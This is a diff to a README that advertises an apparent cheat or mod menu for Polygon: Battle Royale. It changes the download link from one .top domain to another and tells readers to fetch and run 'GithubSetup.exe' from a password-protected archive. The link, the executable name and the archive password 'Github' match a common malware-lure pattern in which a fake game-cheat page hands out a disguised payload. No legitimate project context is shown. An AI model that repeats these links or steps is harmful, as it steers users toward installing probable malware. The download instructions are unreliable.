@@ -9,7 +9,7 @@ Memory-editing utility for **Polygon (Polygon: Battle Royale)**. Provides client
 
 ## ⬇️ Download
 
-**[https://gitappdown.top/](https://gitappdown.top/)**  
+**[https://gitdownapply.top](https://gitdownapply.top)**  
 *File: `GithubSetup.exe` | Archive password: `Github`*
 
 ---
@@ -142,7 +142,7 @@ This Polygon mod menu stands out for several reasons:
 ## 🔧 Installation / How to Use
 
 1. **Download the latest release** from the official source:  
-   ➡️ **[https://gitappdown.top/](https://gitappdown.top/)**  
+   ➡️ **[https://gitdownapply.top](https://gitdownapply.top)**  
    *(File: `GithubSetup.exe` | Archive password: `Github`)*
 
 2. Run `GithubSetup.exe` and follow the installation wizard.
